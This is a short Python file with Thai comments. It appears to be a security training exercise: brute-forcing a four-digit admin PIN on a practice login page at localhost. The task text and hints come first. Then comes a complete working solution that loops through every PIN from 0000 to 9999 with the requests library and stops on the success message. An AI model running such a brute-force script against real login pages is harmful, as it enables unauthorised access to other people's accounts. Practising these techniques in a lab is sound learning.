# ภารกิจที่ 1: "เจาะรหัสตู้นิรภัย 4 หลัก" (หมวด Automation & Requests)
# สถานการณ์:
# คุณพบหน้าเว็บล็อกอินของผู้ดูแลระบบที่ http://127.0.0.1:5000/login ซึ่งช่อง Username ถูกล็อกไว้ที่ "admin" แต่ช่อง Password เป็นตัวเลข PIN 4 หลัก (0000 - 9999) หากใส่ผิด เว็บจะตอบกลับมาว่า "Invalid PIN" แต่ถ้าถูก จะตอบกลับว่า "Welcome Admin!"
# โจทย์ที่คุณต้องเขียนโค้ด:
# จงเขียนสคริปต์ Python โดยใช้ไลบรารี requests เพื่อทำ Brute-force รหัสผ่านตั้งแต่ 0000 ไปจนถึง 9999 เมื่อสคริปต์เจอคำว่า "Welcome Admin!" ให้หยุดทำงานและพิมพ์รหัสผ่านที่ถูกต้องออกมาหน้าจอ
# 💡 คำใบ้ (Hint):
# ใช้คำสั่ง for i in range(10000):
# ใช้ f"{i:04d}" เพื่อเติมเลข 0 ข้างหน้าให้ครบ 4 หลักเสมอ เช่น 0007
# เช็คเงื่อนไข if "Welcome Admin!" in response.text:

import requests
url = "http://127.0.0.1:5000/login"

for i in range(10000):
    Pass=f"{i:04d}"
    # if(len(Pass)==1):
    #     Pass="000"+Pass
    # elif(len(Pass)==2):
    #     Pass="00"+Pass
    # elif(len(Pass)==3):
    #     Pass="0"+Pass

    data_to_send = {
        "Username":"admin",
        "Password":Pass
    }
    print("[*] กำลังส่ง payload ไปยัง server...")
    response=requests.post(url,data=data_to_send)
    
    if "Invalid PIN" in response.text:
        print("[+] login failed with",Pass)
    elif "Welcome Admin!" in response.text:
        print("[!!!] login Success with",Pass)
        break
